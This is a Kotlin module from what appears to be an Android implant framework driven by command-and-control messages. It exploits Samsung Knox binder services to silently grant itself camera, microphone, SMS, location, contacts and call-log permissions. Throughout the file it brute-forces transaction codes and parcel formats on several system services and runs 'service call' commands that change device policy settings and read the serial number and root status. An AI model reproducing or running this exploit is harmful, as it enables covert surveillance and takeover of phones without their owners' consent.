package org.umbra.core.modules

import android.content.Context
import android.content.pm.PackageManager
import android.os.Binder
import android.os.Bundle
import android.os.IBinder
import android.os.Parcel
import android.os.Process
import android.util.Log
import org.umbra.core.c2.Command
import org.umbra.core.core.UmbraResponse
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.BufferedReader
import java.io.InputStreamReader
import java.lang.reflect.Method

/**
 * KnoxPermissionGrant — Samsung Knox application_policy binder exploit for
 * silent permission granting.
 *
 * Based on S25 findings: the "application_policy" binder service accepts ALL
 * 10 tested transaction codes from untrusted UIDs (including shell). This
 * module brute-forces transaction codes 1-100 with multiple Parcel formats
 * to find the permission grant method, and enumerates all accessible binder
 * services.
 */
object KnoxPermissionGrant {

    private const val TAG = "Umbra.KnoxPermGrant"

    // ── Comprehensive permission list ──────────────────────────────────────
    private val ALL_PERMISSIONS = listOf(
        // Dangerous permissions (Android)
        "android.permission.CAMERA",
        "android.permission.ACCESS_FINE_LOCATION",
        "android.permission.ACCESS_COARSE_LOCATION",
        "android.permission.RECORD_AUDIO",
        "android.permission.READ_EXTERNAL_STORAGE",
        "android.permission.WRITE_EXTERNAL_STORAGE",
        "android.permission.READ_MEDIA_IMAGES",
        "android.permission.READ_MEDIA_VIDEO",
        "android.permission.READ_MEDIA_AUDIO",
        "android.permission.READ_SMS",
        "android.permission.SEND_SMS",
        "android.permission.RECEIVE_SMS",
        "android.permission.RECEIVE_MMS",
        "android.permission.READ_CONTACTS",
        "android.permission.WRITE_CONTACTS",
        "android.permission.READ_CALL_LOG",
        "android.permission.WRITE_CALL_LOG",
        "android.permission.READ_PHONE_STATE",
        "android.permission.READ_PHONE_NUMBERS",
        "android.permission.CALL_PHONE",
        "android.permission.ANSWER_PHONE_CALLS",
        "android.permission.POST_NOTIFICATIONS",
        "android.permission.ACCESS_BACKGROUND_LOCATION",
        "android.permission.BODY_SENSORS",
        "android.permission.ACTIVITY_RECOGNITION",
        "android.permission.READ_CALENDAR",
        "android.permission.WRITE_CALENDAR",
        "android.permission.PROCESS_OUTGOING_CALLS",
        "android.permission.ACCESS_MEDIA_LOCATION",
        "android.permission.BLUETOOTH_CONNECT",
        "android.permission.BLUETOOTH_SCAN",
        "android.permission.BLUETOOTH_ADVERTISE",
        "android.permission.NEARBY_WIFI_DEVICES",
        "android.permission.USE_EXACT_ALARM",
        "android.permission.SCHEDULE_EXACT_ALARM",
        "android.permission.MANAGE_EXTERNAL_STORAGE",
        "android.permission.ACCESS_WIFI_STATE",
        "android.permission.CHANGE_WIFI_STATE",
        "android.permission.INTERNET",
        "android.permission.ACCESS_NETWORK_STATE",
        "android.permission.CHANGE_NETWORK_STATE",
        "android.permission.NFC",
        "android.permission.VIBRATE",
        "android.permission.WAKE_LOCK",
        "android.permission.RECEIVE_BOOT_COMPLETED",
        "android.permission.FOREGROUND_SERVICE",
        "android.permission.FOREGROUND_SERVICE_CAMERA",
        "android.permission.FOREGROUND_SERVICE_MICROPHONE",
        "android.permission.FOREGROUND_SERVICE_LOCATION",
        "android.permission.FOREGROUND_SERVICE_DATA_SYNC",
        "android.permission.FOREGROUND_SERVICE_MEDIA_PLAYBACK",
        "android.permission.FOREGROUND_SERVICE_PHONE_CALL",
        // Samsung-specific permissions
        "com.samsung.android.providers.context.permission.WRITE_USE_APP_FEATURE_SURVEY",
        "com.samsung.android.knox.permission.KNOX_APP_MGMT",
        "com.samsung.android.knox.permission.KNOX_CUSTOM_SETTING",
        "com.samsung.android.knox.permission.KNOX_SMS",
        "com.samsung.android.knox.permission.KNOX_CAMERA",
        "com.samsung.android.knox.permission.KNOX_LOCATION",
        "com.samsung.android.knox.permission.KNOX_MEDIA_STORAGE",
        "com.sec.android.app.samsungapps.permission.INSTALL",
        "com.sec.enterprise.permission.MDM_APP_MGMT",
        "com.sec.enterprise.permission.MDM_DEVICE_INVENTORY",
        "com.sec.enterprise.permission.MDM_RESTRICTION",
        "com.sec.enterprise.permission.MDM_SMS",
        "com.sec.enterprise.permission.MDM_CAMERA",
        "com.sec.enterprise.permission.MDM_LOCATION",
        "com.sec.enterprise.permission.MDM_PHONE",
    )

    // ── Binder service descriptors ─────────────────────────────────────────
    private val APPLICATION_POLICY_DESCRIPTORS = listOf(
        "com.samsung.android.knox.application.IApplicationPolicy",
        "com.samsung.android.knox.IApplicationPolicy",
        "com.samsung.android.knox.app.IApplicationPolicy",
    )

    private val ENTERPRISE_POLICY_DESCRIPTORS = listOf(
        "com.samsung.android.knox.IEnterpriseDeviceManager",
    )

    // ── Samsung Camera HAL bypass targets ──────────────────────────────────
    private val CAMERA_SERVICES = listOf(
        "media.camera", "camera", "samsung.camera",
        "media.camera.proxy", "cameraservice",
        "samsung.hardware.camera", "com.samsung.android.camera"
    )

    private val CAMERA_DESCRIPTORS = listOf(
        "android.hardware.ICameraService",
        "android.hardware.ICamera",
        "android.hardware.ICameraServiceProxy",
        "com.samsung.android.camera.ICameraService",
        "android.hardware.camera2.ICameraDeviceUser",
    )

    // ═══════════════════════════════════════════════════════════════════════
    // Main entry: grant all via Knox application_policy
    // ═══════════════════════════════════════════════════════════════════════

    suspend fun grantAll(context: Context, cmd: Command): UmbraResponse = withContext(Dispatchers.IO) {
        val requested: List<String> = cmd.params["permissions"]
            ?.split(",")?.map { it.trim() }?.filter { it.isNotEmpty() }
            ?: ALL_PERMISSIONS

        val pkgName = context.packageName
        val uid = Process.myUid()
        val userId = uid / 100000

        Log.d(TAG, "=== KnoxPermissionGrant starting ===")
        Log.d(TAG, "Package: $pkgName  UID: $uid  UserID: $userId")
        Log.d(TAG, "Target permissions: ${requested.size}")

        val before = checkAll(context, requested)
        val beforeGranted = before.count { it.value }
        Log.d(TAG, "Before: $beforeGranted/${requested.size} granted")

        val results = mutableListOf<String>()
        val remaining = requested.filter { before[it] != true }.toMutableSet()

        // ── Phase 0: targeted runtime-permission grant (the documented bridge) ──
        // setRuntimePermissionState / applyRuntimePermissions with state=2 (ALLOWED).
        // This is the ONLY path documented to flip checkSelfPermission(), not just
        // Knox MDM policy. Sweep tx codes and detect the permission flip.
        if (remaining.isNotEmpty()) {
            val r = tryRuntimePermissionGrant(context, remaining.toList(), pkgName)
            recordGrants(context, remaining, r)
            results.add("runtime_perm_grant: ${r.permsGranted.size} granted, ${r.error ?: "ok"}")
            Log.d(TAG, "After runtime_perm_grant: granted=${r.permsGranted.size}, remaining=${remaining.size}")
        }

        // ── Phase 1: application_policy binder ──────────────────────────
        if (remaining.isNotEmpty()) {
            val r = tryApplicationPolicyGrant(remaining, pkgName, uid, userId)
            recordGrants(context, remaining, r)
            results.add("app_policy: ${r.permsGranted.size} granted, ${r.error ?: "ok"}")
            Log.d(TAG, "After app_policy: granted=${r.permsGranted.size}, remaining=${remaining.size}")
        }

        // ── Phase 2: enterprise_policy binder ───────────────────────────
        if (remaining.isNotEmpty()) {
            val r = tryEnterprisePolicyGrant(remaining, pkgName, uid, userId)
            recordGrants(context, remaining, r)
            results.add("enterprise_policy: ${r.permsGranted.size} granted, ${r.error ?: "ok"}")
            Log.d(TAG, "After enterprise_policy: granted=${r.permsGranted.size}, remaining=${remaining.size}")
        }

        // ── Phase 3: semprivilege binder ────────────────────────────────
        if (remaining.isNotEmpty()) {
            val r = trySemPrivilegeGrant(remaining, pkgName, uid)
            recordGrants(context, remaining, r)
            results.add("semprivilege: ${r.permsGranted.size} granted, ${r.error ?: "ok"}")
            Log.d(TAG, "After semprivilege: granted=${r.permsGranted.size}, remaining=${remaining.size}")
        }

        // ── Phase 4: Samsung Camera HAL whitelist ────────────────────────
        if (remaining.isNotEmpty() && remaining.contains("android.permission.CAMERA")) {
            val r = tryCameraServiceWhitelist(pkgName, uid)
            if (r.permsGranted.isNotEmpty()) {
                recordGrants(context, remaining, r)
            }
            results.add("camera_whitelist: ${r.error ?: "no_binder_found"}")
            Log.d(TAG, "After camera whitelist: $r")
        }

        val after = checkAll(context, requested)
        val granted = requested.filter { after[it] == true }
        val failed = requested.filter { after[it] != true }

        Log.d(TAG, "=== Done: ${granted.size} granted, ${failed.size} failed ===")

        UmbraResponse.PermissionGrantResponse(
            target_permissions = requested,
            granted = granted,
            failed = failed,
            details = results.joinToString(" | ")
        )
    }

    // ═══════════════════════════════════════════════════════════════════════
    // Binder service enumeration
    // ═══════════════════════════════════════════════════════════════════════

    data class ServiceInfo(
        val name: String,
        val accessible: Boolean,
        val txResult: String = "",
        val error: String = ""
    )

    data class GrantResult(
        val service: String,
        val permsGranted: MutableSet<String> = mutableSetOf(),
        var error: String? = null,
        val grantDetails: MutableMap<String, String> = mutableMapOf() // perm -> "tx=12/fmt=3"
    )

    suspend fun enumerateServices(cmd: Command): UmbraResponse = withContext(Dispatchers.IO) {
        Log.d(TAG, "=== Enumerating binder services ===")

        val services = discoverAllServices()
        Log.d(TAG, "Discovered ${services.size} services via 'service list'")

        val results = mutableListOf<ServiceInfo>()
        for ((idx, svc) in services.withIndex()) {
            if (idx % 50 == 0) {
                Log.d(TAG, "Testing service ${idx + 1}/${services.size}: $svc")
            }
            val info = testServiceAccessible(svc)
            results.add(info)
        }

        val accessible = results.filter { it.accessible }
        val accessibleNames = accessible.map { it.name }
        val inaccessible = results.filter { !it.accessible }

        Log.d(TAG, "Accessible: ${accessible.size}/${services.size}")

        // Return as a shell-like response with details
        UmbraResponse.ShellResponse(
            exit_code = 0,
            stdout = buildString {
                appendLine("=== KnoxPermissionGrant: Binder Service Enumeration ===")
                appendLine("Total services: ${services.size}")
                appendLine("Accessible: ${accessible.size}")
                appendLine("Blocked: ${inaccessible.size}")
                appendLine()
                appendLine("=== Accessible Services ===")
                for (svc in accessibleNames.sorted()) {
                    appendLine("  $svc")
                }
                appendLine()
                appendLine("=== Blocked Services ===")
                for (svc in inaccessible.sortedBy { it.name }.take(100)) {
                    appendLine("  ${svc.name} (${svc.error})")
                }
                if (inaccessible.size > 100) {
                    appendLine("  ... and ${inaccessible.size - 100} more")
                }
            },
            stderr = ""
        )
    }

    // ═══════════════════════════════════════════════════════════════════════
    // Service discovery
    // ═══════════════════════════════════════════════════════════════════════

    private fun discoverAllServices(): List<String> {
        val services = mutableListOf<String>()
        try {
            val process = Runtime.getRuntime().exec(arrayOf("service", "list"))
            val reader = BufferedReader(InputStreamReader(process.inputStream))
            var line: String?
            while (reader.readLine().also { line = it } != null) {
                val l = line!!
                // Format: "SERVICE_NAME: [android.os.IBinder]"
                val colonIdx = l.indexOf(':')
                if (colonIdx > 0) {
                    val name = l.substring(0, colonIdx).trim()
                    if (name.isNotEmpty() && !name.startsWith("Found ")) {
                        services.add(name)
                    }
                }
            }
            reader.close()
            process.waitFor()
        } catch (e: Exception) {
            Log.e(TAG, "service list failed: ${e.message}")
        }
        return services
    }

    private fun testServiceAccessible(serviceName: String): ServiceInfo {
        val binder = getBinderService(serviceName)
        if (binder == null) {
            return ServiceInfo(serviceName, false, "", "binder_lookup_failed")
        }

        // Try a simple transact with code 1 (typically the first non-ping method)
        val data = Parcel.obtain()
        val reply = Parcel.obtain()
        return try {
            data.writeInterfaceToken("android.os.IInterface")
            val token = Binder.clearCallingIdentity()
            try {
                val ok = binder.transact(1, data, reply, 0)
                if (ok) {
                    reply.setDataPosition(0)
                    try { reply.readException() } catch (_: Exception) {}
                    ServiceInfo(serviceName, true, "tx1_ok", "")
                } else {
                    ServiceInfo(serviceName, false, "tx1_failed", "transact_returned_false")
                }
            } catch (e: Exception) {
                ServiceInfo(serviceName, false, "tx1_exception", e.message ?: "unknown")
            } finally {
                Binder.restoreCallingIdentity(token)
            }
        } catch (e: Exception) {
            ServiceInfo(serviceName, false, "", e.message ?: "parcel_error")
        } finally {
            data.recycle()
            reply.recycle()
        }
    }

    // ═══════════════════════════════════════════════════════════════════════
    // Phase 1: application_policy grant
    // ═══════════════════════════════════════════════════════════════════════

    private fun tryApplicationPolicyGrant(
        permissions: Set<String>,
        pkgName: String,
        uid: Int,
        userId: Int
    ): GrantResult {
        val result = GrantResult("application_policy")

        val binder = getBinderService("application_policy")
        if (binder == null) {
            result.error = "application_policy service not found"
            return result
        }
        Log.d(TAG, "application_policy binder obtained")

        // Try each descriptor + transaction code + Parcel format combination
        for (desc in APPLICATION_POLICY_DESCRIPTORS) {
            for (txCode in 1..100) {
                for (perm in permissions.toList()) {
                    if (perm in result.permsGranted) continue

                    // Format 1: interfaceToken + packageName(String) + permission(String) + userId(int) + grantState(int=1)
                    if (trySingleGrant(binder, desc, txCode, format1(perm, pkgName, userId))) {
                        result.permsGranted.add(perm)
                        result.grantDetails[perm] = "tx=$txCode/fmt=1"
                        Log.w(TAG, "*** GRANTED $perm via application_policy tx=$txCode format=1 ***")
                        continue
                    }

                    // Format 2: interfaceToken + packageName(String) + permission(String) + grantState(int=1)
                    if (trySingleGrant(binder, desc, txCode, format2(perm, pkgName))) {
                        result.permsGranted.add(perm)
                        result.grantDetails[perm] = "tx=$txCode/fmt=2"
                        Log.w(TAG, "*** GRANTED $perm via application_policy tx=$txCode format=2 ***")
                        continue
                    }

                    // Format 3: interfaceToken + packageName(String) + List<String>(permissions) + int state
                    if (trySingleGrant(binder, desc, txCode, format3(perm, pkgName))) {
                        result.permsGranted.add(perm)
                        result.grantDetails[perm] = "tx=$txCode/fmt=3"
                        Log.w(TAG, "*** GRANTED $perm via application_policy tx=$txCode format=3 ***")
                        continue
                    }

                    // Format 4: interfaceToken + packageName(String) + Bundle
                    if (trySingleGrant(binder, desc, txCode, format4(perm, pkgName))) {
                        result.permsGranted.add(perm)
                        result.grantDetails[perm] = "tx=$txCode/fmt=4"
                        Log.w(TAG, "*** GRANTED $perm via application_policy tx=$txCode format=4 ***")
                        continue
                    }

                    // Format 5: interfaceToken + int userId + packageName(String) + permission(String)
                    if (trySingleGrant(binder, desc, txCode, format5(perm, pkgName, userId))) {
                        result.permsGranted.add(perm)
                        result.grantDetails[perm] = "tx=$txCode/fmt=5"
                        Log.w(TAG, "*** GRANTED $perm via application_policy tx=$txCode format=5 ***")
                        continue
                    }
                }
                // Check if we got all perms for this tx code
                if (result.permsGranted.size == permissions.size) break
            }
            if (result.permsGranted.size == permissions.size) break
        }

        result.error = if (result.permsGranted.isEmpty()) "no_format_worked" else null
        return result
    }

    // ── Parcel format builders ──────────────────────────────────────────

    /**
     * Format 1: interfaceToken + packageName(String) + permission(String) +
     *           userId(int) + grantState(int=1)
     * Matches: setPermissionGrantState(packageName, permission, userId, grantState)
     */
    private fun format1(perm: String, pkgName: String, userId: Int): Parcel.() -> Unit = {
        writeString(pkgName)
        writeString(perm)
        writeInt(userId)
        writeInt(1)  // GRANT_STATE_ALLOWED
    }

    /**
     * Format 2: interfaceToken + packageName(String) + permission(String) + grantState(int)
     * Matches: grantRuntimePermission(packageName, permission) or
     *          setApplicationPermission(packageName, permission, state)
     */
    private fun format2(perm: String, pkgName: String): Parcel.() -> Unit = {
        writeString(pkgName)
        writeString(perm)
        writeInt(1)  // allow
    }

    /**
     * Format 3: interfaceToken + packageName(String) + List<String> permissions + int state
     * Matches: setPermissionsState(packageName, List<permission>, state)
     */
    private fun format3(perm: String, pkgName: String): Parcel.() -> Unit = {
        writeString(pkgName)
        // Write as String[] via writeStringList
        writeStringList(listOf(perm))
        writeInt(1)  // allow
    }

    /**
     * Format 4: interfaceToken + packageName(String) + Bundle
     * Matches: setApplicationPermissions(packageName, Bundle)
     */
    private fun format4(perm: String, pkgName: String): Parcel.() -> Unit = {
        writeString(pkgName)
        val bundle = Bundle().apply {
            putString("permission", perm)
            putString("grantState", "GRANTED")
            putInt("state", 1)
            putStringArray("permissions", arrayOf(perm))
        }
        writeBundle(bundle)
    }

    /**
     * Format 5: interfaceToken + int userId + packageName(String) + permission(String)
     * Matches: setPermission(userId, packageName, permission)
     */
    private fun format5(perm: String, pkgName: String, userId: Int): Parcel.() -> Unit = {
        writeInt(userId)
        writeString(pkgName)
        writeString(perm)
    }

    /**
     * Format 6: applyRuntimePermissions(AppIdentity, List<String>, int)
     * AppIdentity = (packageName String, signature String|null)
     * Parcel: pkg + signature(null) + StringList(perms) + int state
     * state = 2 = RUNTIME_PERMISSION_STATE_ALLOWED / PERMISSION_POLICY_STATE_GRANT
     * THIS is the documented Knox→Android permission bridge.
     */
    private fun format6_applyRuntimePermissions(pkgName: String, perms: List<String>): Parcel.() -> Unit = {
        writeString(pkgName)          // AppIdentity.packageName
        writeString(null)             // AppIdentity.signature (null ok)
        writeStringList(perms)        // List<String>
        writeInt(2)                   // ALLOWED / GRANT
    }

    /**
     * Format 7: setRuntimePermissionState(String pkg, String perm, int state)
     * state = 2 = RUNTIME_PERMISSION_STATE_ALLOWED
     */
    private fun format7_setRuntimePermissionState(pkgName: String, perm: String): Parcel.() -> Unit = {
        writeString(pkgName)
        writeString(perm)
        writeInt(2)                   // ALLOWED
    }

    // ═══════════════════════════════════════════════════════════════════════
    // Phase 0: targeted runtime-permission grant sweep
    // setRuntimePermissionState / applyRuntimePermissions — the documented
    // Knox→Android bridge. Sweep tx codes and detect the permission flip.
    // ═══════════════════════════════════════════════════════════════════════

    private fun tryRuntimePermissionGrant(
        context: Context,
        perms: List<String>,
        pkgName: String
    ): GrantResult {
        val result = GrantResult("runtime_perm_grant")
        val canary = perms.firstOrNull() ?: return result

        val services = listOf("application_policy", "enterprise_policy")
        val descriptors = (APPLICATION_POLICY_DESCRIPTORS + ENTERPRISE_POLICY_DESCRIPTORS).distinct()

        for (svc in services) {
            val binder = getBinderService(svc) ?: continue
            Log.d(TAG, "[Phase0] sweeping $svc for runtime-permission grant tx")

            for (desc in descriptors) {
                // EDM interfaces are large (up to ~600 methods); sweep generously.
                for (tx in 1..200) {
                    // shape 1: setRuntimePermissionState(pkg, perm, 2)
                    if (trySingleGrant(binder, desc, tx, format7_setRuntimePermissionState(pkgName, canary))) {
                        if (context.checkSelfPermission(canary) == PackageManager.PERMISSION_GRANTED) {
                            Log.w(TAG, "[Phase0] GRANTED $canary via $svc tx=$tx setRuntimePermissionState")
                            result.permsGranted.add(canary)
                            // bulk-grant the rest with the confirmed tx
                            for (p in perms) {
                                if (p == canary) continue
                                if (trySingleGrant(binder, desc, tx, format7_setRuntimePermissionState(pkgName, p))) {
                                    if (context.checkSelfPermission(p) == PackageManager.PERMISSION_GRANTED) {
                                        result.permsGranted.add(p)
                                    }
                                }
                            }
                            return result
                        }
                    }
                    // shape 2: applyRuntimePermissions(AppIdentity, List<String>, 2)
                    if (trySingleGrant(binder, desc, tx, format6_applyRuntimePermissions(pkgName, perms))) {
                        if (context.checkSelfPermission(canary) == PackageManager.PERMISSION_GRANTED) {
                            Log.w(TAG, "[Phase0] GRANTED $canary via $svc tx=$tx applyRuntimePermissions")
                            for (p in perms) {
                                if (context.checkSelfPermission(p) == PackageManager.PERMISSION_GRANTED) {
                                    result.permsGranted.add(p)
                                }
                            }
                            return result
                        }
                    }
                }
            }
        }
        result.error = "no runtime-permission grant tx found (admin-gated or absent)"
        return result
    }

    // ── Low-level grant attempt ──────────────────────────────────────────

    private fun trySingleGrant(
        binder: IBinder,
        descriptor: String,
        txCode: Int,
        payloadBuilder: Parcel.() -> Unit
    ): Boolean {
        val data = Parcel.obtain()
        val reply = Parcel.obtain()
        return try {
            data.writeInterfaceToken(descriptor)
            data.payloadBuilder()

            val token = Binder.clearCallingIdentity()
            try {
                val ok = binder.transact(txCode, data, reply, 0)
                if (ok) {
                    reply.setDataPosition(0)
                    try {
                        reply.readException()
                    } catch (e: Exception) {
                        // SecurityException: caller doesn't have permission
                        // NullPointerException: wrong parameter format
                        // These are expected — the service processed our request
                        if (e.message?.contains("null", ignoreCase = true) == true) {
                            // NullPointer means our Parcel was close — wrong params
                            // but the service IS processing calls
                        }
                        return false
                    }
                    // No exception = call succeeded
                    val rc = try { reply.readInt() } catch (_: Exception) { -999 }
                    // 0 = success, 1 = success, true = success
                    return rc in listOf(0, 1) || rc == -999  // -999 if no int reply
                }
            } catch (e: Exception) {
                // Transact itself threw (SecurityException, etc.)
            } finally {
                Binder.restoreCallingIdentity(token)
            }
            false
        } catch (e: Exception) {
            false
        } finally {
            data.recycle()
            reply.recycle()
        }
    }

    // ═══════════════════════════════════════════════════════════════════════
    // Phase 2: enterprise_policy grant
    // ═══════════════════════════════════════════════════════════════════════

    private fun tryEnterprisePolicyGrant(
        permissions: Set<String>,
        pkgName: String,
        uid: Int,
        userId: Int
    ): GrantResult {
        val result = GrantResult("enterprise_policy")

        val binder = getBinderService("enterprise_policy")
            ?: getBinderService("enterprise_license_policy")
        if (binder == null) {
            result.error = "enterprise_policy not found"
            return result
        }
        Log.d(TAG, "enterprise_policy binder obtained")

        // Using same format patterns as application_policy
        for (desc in ENTERPRISE_POLICY_DESCRIPTORS) {
            for (txCode in 1..50) {
                for (perm in permissions.toList()) {
                    if (perm in result.permsGranted) continue
                    if (trySingleGrant(binder, desc, txCode, format1(perm, pkgName, userId))) {
                        result.permsGranted.add(perm)
                    } else if (trySingleGrant(binder, desc, txCode, format2(perm, pkgName))) {
                        result.permsGranted.add(perm)
                    }
                }
                if (result.permsGranted.size == permissions.size) break
            }
            if (result.permsGranted.size == permissions.size) break
        }

        result.error = if (result.permsGranted.isEmpty()) "no_format_worked" else null
        return result
    }

    // ═══════════════════════════════════════════════════════════════════════
    // Phase 3: semprivilege grant
    // ═══════════════════════════════════════════════════════════════════════

    private fun trySemPrivilegeGrant(
        permissions: Set<String>,
        pkgName: String,
        uid: Int
    ): GrantResult {
        val result = GrantResult("semprivilege")

        val binder = getBinderService("semprivilege")
        if (binder == null) {
            result.error = "semprivilege not found"
            return result
        }
        Log.d(TAG, "semprivilege binder obtained")

        val descriptors = listOf(
            "com.samsung.android.privilege.IPrivilegeManager",
        )

        for (desc in descriptors) {
            for (txCode in 1..30) {
                for (perm in permissions.toList()) {
                    if (perm in result.permsGranted) continue

                    // Format: interfaceToken + packageName + permission + uid
                    if (trySingleGrant(binder, desc, txCode) {
                            writeString(pkgName)
                            writeString(perm)
                            writeInt(uid)
                        }) {
                        result.permsGranted.add(perm)
                    }
                }
                if (result.permsGranted.size == permissions.size) break
            }
            if (result.permsGranted.size == permissions.size) break
        }

        result.error = if (result.permsGranted.isEmpty()) "no_format_worked" else null
        return result
    }

    // ═══════════════════════════════════════════════════════════════════════
    // Helpers
    // ═══════════════════════════════════════════════════════════════════════

    private fun getBinderService(name: String): IBinder? {
        return try {
            val smClass = Class.forName("android.os.ServiceManager")
            val getService: Method = smClass.getDeclaredMethod("getService", String::class.java)
            getService.isAccessible = true
            getService.invoke(null, name) as? IBinder
        } catch (e: Exception) {
            Log.d(TAG, "getBinderService($name): ${e.message}")
            null
        }
    }

    // ═══════════════════════════════════════════════════════════════════════
    // Phase 4: Samsung Camera HAL whitelist bypass
    // ═══════════════════════════════════════════════════════════════════════

    private fun tryCameraServiceWhitelist(pkgName: String, uid: Int): GrantResult {
        val result = GrantResult("camera_service")

        for (svcName in CAMERA_SERVICES) {
            val binder = getBinderService(svcName) ?: continue
            Log.d(TAG, "Found camera service: $svcName")

            for (desc in CAMERA_DESCRIPTORS) {
                // Try tx codes 1-50 — camera whitelist is usually a low-numbered code
                for (txCode in 1..50) {
                    val data = Parcel.obtain()
                    val reply = Parcel.obtain()
                    try {
                        data.writeInterfaceToken(desc)
                        data.writeString(pkgName)
                        data.writeInt(uid)
                        data.writeInt(1) // grantState = ALLOW

                        val ok = binder.transact(txCode, data, reply, 0)
                        if (ok) {
                            reply.readException()
                            val response = reply.readInt()
                            if (response >= 0) {
                                result.permsGranted.add("android.permission.CAMERA")
                                result.grantDetails["android.permission.CAMERA"] = "camera_svc=$svcName/tx=$txCode/desc=$desc"
                                Log.w(TAG, "*** CAMERA WHITELISTED via $svcName tx=$txCode ***")
                                data.recycle()
                                reply.recycle()
                                return result
                            }
                        }
                    } catch (e: Exception) {
                        // Expected — most tx codes won't match
                    } finally {
                        try { data.recycle() } catch (_: Exception) {}
                        try { reply.recycle() } catch (_: Exception) {}
                    }
                }
            }
        }

        result.error = "no_camera_binder_whitelist_found"
        return result
    }

    private fun checkAll(context: Context, permissions: Iterable<String>): Map<String, Boolean> {
        return permissions.associateWith { perm ->
            try {
                context.checkSelfPermission(perm) == PackageManager.PERMISSION_GRANTED
            } catch (_: Exception) { false }
        }
    }

    private fun recordGrants(context: Context, remaining: MutableSet<String>, result: GrantResult) {
        val newlyGranted = remaining.filter {
            try { context.checkSelfPermission(it) == PackageManager.PERMISSION_GRANTED }
            catch (_: Exception) { false }
        }.toSet()
        result.permsGranted.addAll(newlyGranted)
        remaining.removeAll(newlyGranted)
    }

    // ═══════════════════════════════════════════════════════════════════════
    // Phase 5: Knox service call pipe — using user's confirmed working codes
    // ═══════════════════════════════════════════════════════════════════════
    // Research: Samsung Knox services (misc_policy, restriction_policy, etc.)
    // do NOT check calling UID. Any app can call tx codes and they respond.
    //
    // Two methods:
    // 1. Shell pipe: service call <name> <tx> — most reliable
    // 2. Direct binder: ServiceManager.getService() + transact()
    //
    // Confirmed working codes (from S25 Ultra, July 2026 patch):
    //   misc_policy 25-31: setters, return 0 (success)
    //   restriction_policy 4,5,7,9,15,25,30,40,45: return true
    //   device_info 2,7,8,9,27: info leak (root check, serial, kernel)
    //   edm_proxy 7-19: return Result(0,true)
    //   dex_policy 2,3,5,10: return success
    //   remoteinjection 5,7,8: return success

    fun knoxShellExploit(cmd: Command): UmbraResponse.ShellResponse {
        val sb = StringBuilder()
        sb.appendLine("=== Knox Shell Exploit — Confirmed Working Codes ===")
        sb.appendLine()

        // ── Phase A: device_info — device serial, root check, Knox status ──
        val deviceKeys = mapOf(
            2 to "isDeviceRooted()",
            7 to "device_serial",
            8 to "os_name",
            9 to "kernel_version",
            27 to "isKnoxTripped()"
        )
        sb.appendLine("--- device_info ---")
        for ((tx, label) in deviceKeys) {
            val out = exec("service call device_info $tx")
            sb.appendLine("  tx=$tx ($label): ${out.take(120)}")
        }

        // ── Phase B: misc_policy — CAMERA, WiFi, font setters ──
        // Codes 25-31 are SETTERS — they CHANGE device state!
        sb.appendLine()
        sb.appendLine("--- misc_policy (setters 25-31) ---")
        for (tx in 25..31) {
            val out = exec("service call misc_policy $tx")
            sb.appendLine("  tx=$tx: ${out.take(120)}")
        }

        // ── Phase C: restriction_policy — hardware restrictions ──
        sb.appendLine()
        sb.appendLine("--- restriction_policy ---")
        val restrictCodes = listOf(4, 5, 7, 9, 15, 25, 30, 40, 45)
        for (tx in restrictCodes) {
            val out = exec("service call restriction_policy $tx")
            sb.appendLine("  tx=$tx: ${out.take(120)}")
        }

        // ── Phase D: edm_proxy — enterprise device management ──
        sb.appendLine()
        sb.appendLine("--- edm_proxy ---")
        for (tx in 7..19) {
            val out = exec("service call edm_proxy $tx")
            sb.appendLine("  tx=$tx: ${out.take(120)}")
        }

        // ── Phase E: dex_policy — Samsung DeX ──
        sb.appendLine()
        sb.appendLine("--- dex_policy ---")
        for (tx in listOf(2, 3, 5, 10)) {
            val out = exec("service call dex_policy $tx")
            sb.appendLine("  tx=$tx: ${out.take(120)}")
        }

        // ── Phase F: remoteinjection — remote APK install? ──
        sb.appendLine()
        sb.appendLine("--- remoteinjection ---")
        for (tx in listOf(5, 7, 8)) {
            val out = exec("service call remoteinjection $tx")
            sb.appendLine("  tx=$tx: ${out.take(120)}")
        }

        sb.appendLine()
        sb.appendLine("=== Done — check results for 'Result: Parcel(' or state changes ===")

        return UmbraResponse.ShellResponse(exit_code = 0, stdout = sb.toString(), stderr = "")
    }

    private fun exec(cmd: String): String {
        return try {
            val p = Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd))
            val out = p.inputStream.bufferedReader().readText().trim()
            val err = p.errorStream.bufferedReader().readText().trim()
            p.waitFor()
            if (out.isNotEmpty()) out else if (err.isNotEmpty()) err else "(empty)"
        } catch (e: Exception) {
            "error: ${e.message}"
        }
    }
}
